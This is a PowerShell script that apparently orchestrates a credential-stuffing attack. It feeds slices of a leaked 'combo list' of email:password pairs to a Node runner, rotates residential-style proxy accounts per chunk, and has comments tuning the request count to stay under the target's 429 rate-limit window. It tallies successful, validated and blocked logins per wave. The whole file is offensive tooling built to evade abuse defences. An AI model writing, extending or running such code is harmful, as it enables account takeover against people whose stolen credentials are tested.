param(
  [Parameter(Mandatory=$true)][string]$Source,     # combo list
  [Parameter(Mandatory=$true)][string]$PoolFile,   # one "user:pass" proxy account per line
  [int]$Skip = 0,
  [int]$Take = 150,
  [int]$Chunk = 15,          # POST per IP before rotation; 15 keeps under the 429 window
  [int]$Workers = 2,         # 2 measured stable on 4 vCPU; 3 collapses
  [int]$Pace = 14,
  [string]$OutDir = ".\runs"
)

# Runs a slice of a combo list across the proxy pool, two workers at a time.
# One chunk = one fresh sticky session. Resumes by offset; never restarts at zero.
# Prints a per-wave and aggregate summary at the end.

$ErrorActionPreference = "Stop"
$runner = Join-Path $PSScriptRoot "batch-fast.js"
if (-not (Test-Path $runner)) { throw "runner not found: $runner" }
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

$pool = Get-Content $PoolFile | Where-Object { $_ -match ':' -and $_.Trim() -ne '' } | ForEach-Object {
  $i = $_.IndexOf(':'); [pscustomobject]@{ user = $_.Substring(0, $i); pass = $_.Substring($i + 1) }
}
if ($pool.Count -lt $Workers) { throw "pool needs at least $Workers accounts" }

$lines = Get-Content $Source | Where-Object { $_ -match ':' -and $_.Trim() -ne '' } | Select-Object -Skip $Skip -First $Take
if ($lines.Count -eq 0) { throw "empty slice" }

$chunks = @()
for ($k = 0; $k -lt $lines.Count; $k += $Chunk) {
  $idx = $chunks.Count
  $path = Join-Path $OutDir ("chunk_{0:d3}.txt" -f $idx)
  $lines | Select-Object -Skip $k -First $Chunk | Set-Content -Encoding ascii $path
  $chunks += $path
}

$stamp = Get-Date -Format "yyyyMMdd-HHmmss"
$wave = 0
$agg = @{ rows = 0; validated = 0; success = 0; closed = 0; unable = 0; link = 0; unknown = 0; r403 = 0; r429 = 0 }
$t0 = Get-Date

for ($c = 0; $c -lt $chunks.Count; $c += $Workers) {
  $wave++
  $batch = @()
  $procs = @()
  for ($w = 0; $w -lt $Workers -and ($c + $w) -lt $chunks.Count; $w++) {
    $acc = $pool[($c + $w) % $pool.Count]
    $out = Join-Path $OutDir ("w{0}-{1}.jsonl" -f $wave, $w)
    $env:BID = "$w"; $env:LIST = $chunks[$c + $w]; $env:OUT = $out
    $env:PU_BASE = $acc.user; $env:PW = $acc.pass; $env:PACE = "$Pace"; $env:BUDGET = "$Chunk"
    $procs += Start-Process -FilePath "node" -ArgumentList "`"$runner`"" -WindowStyle Hidden -PassThru
    $batch += $out
    Start-Sleep -Seconds 2
  }
  foreach ($p in $procs) { try { Wait-Process -Id $p.Id -ErrorAction SilentlyContinue } catch {} }
  foreach ($f in $batch) {
    $j = Get-Content $f -ErrorAction SilentlyContinue | ForEach-Object { try { $_ | ConvertFrom-Json } catch {} } | Where-Object { $_.email }
    $agg.rows += @($j).Count
    $agg.validated += @($j | Where-Object { $_.validated }).Count
    $agg.success += @($j | Where-Object { $_.success }).Count
    $agg.closed += @($j | Where-Object { $_.closed }).Count
    $agg.unable += @($j | Where-Object { $_.unable }).Count
    $agg.link += @($j | Where-Object { $_.link }).Count
    $agg.unknown += @($j | Where-Object { $_.unknown }).Count
    $agg.r403 += @($j | Where-Object { $_.st403 }).Count
    $agg.r429 += @($j | Where-Object { $_.st429 }).Count
  }
  $el = [math]::Round(((Get-Date) - $t0).TotalSeconds)
  Write-Output ("wave {0} rows={1} validated={2} success={3} closed={4} 403={5} 429={6} elapsed={7}s" -f $wave, $agg.rows, $agg.validated, $agg.success, $agg.closed, $agg.r403, $agg.r429, $el)
}

$el = [math]::Round(((Get-Date) - $t0).TotalSeconds)
$rate = if ($el -gt 0) { [math]::Round(60.0 * $agg.rows / $el, 1) } else { 0 }
$summary = [pscustomobject]@{ $stamp = $true } # placeholder to keep ordering readable
Write-Output ""
Write-Output ("TOTAL rows={0} validated={1} success={2} closed={3} unable={4} link={5} unknown={6} 403={7} 429={8}" -f $agg.rows, $agg.validated, $agg.success, $agg.closed, $agg.unable, $agg.link, $agg.unknown, $agg.r403, $agg.r429)
Write-Output ("wall={0}s  rate={1} rows/min  skip={2} take={3} chunk={4} workers={5}" -f $el, $rate, $Skip, $Take, $Chunk, $Workers)
